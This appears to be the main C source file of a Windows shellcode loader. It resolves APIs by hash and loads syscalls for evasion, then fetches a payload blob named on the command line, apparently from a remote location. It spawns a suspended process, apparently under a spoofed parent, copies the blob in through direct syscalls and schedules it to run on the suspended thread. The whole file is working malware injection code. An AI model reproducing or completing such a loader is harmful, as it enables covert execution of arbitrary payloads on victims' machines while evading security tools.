#include "common.h"

// Function defined in Resolve.cpp; Used to initialize variables
// those are resolved from their hash rather than name/string value
extern BOOL Initialize(
	OUT PSYSCALL_TABLE* ppSyscallTable,
	OUT	PH_API* ppHashedApis,
	OUT	PHANDLE			phParent
);

int wmain(int argc, wchar_t** argv) {
	PBYTE			pBlob = NULL,
		pBlobCopy = NULL;
	SIZE_T			sBlobSize = 0;
	HANDLE			hParentProcess = NULL,
		hProcess = NULL,
		hThread = NULL;
	DWORD			dwProcessID = 0;
	PH_API			pHashedApis = { 0 };
	PSYSCALL_TABLE	pSyscallTable = { 0 };


	Initialize(&pSyscallTable, &pHashedApis, &hParentProcess);

	FetchBlob(pHashedApis, argv[1], &pBlob, &sBlobSize);
	//PrintHexData(pBlob, sBlobSize);

	CreateSuspendedProcess(pHashedApis, argv[2], hParentProcess, &hProcess, &hThread, &dwProcessID);

	//DEBUG_PRINT("Created process with PID: %d\n", dwProcessID);
	//getchar();

	CopyBlob(pSyscallTable, hProcess, pBlob, sBlobSize, &pBlobCopy);

	ScheduleRun(pSyscallTable, hThread, pBlobCopy);

	pHashedApis->pDebugActiveProcessStop(dwProcessID);

#ifdef LOG_DEBUG_MSG
	system("PAUSE");
#endif // !LOG_DEBUG_MSG
	return 0;
}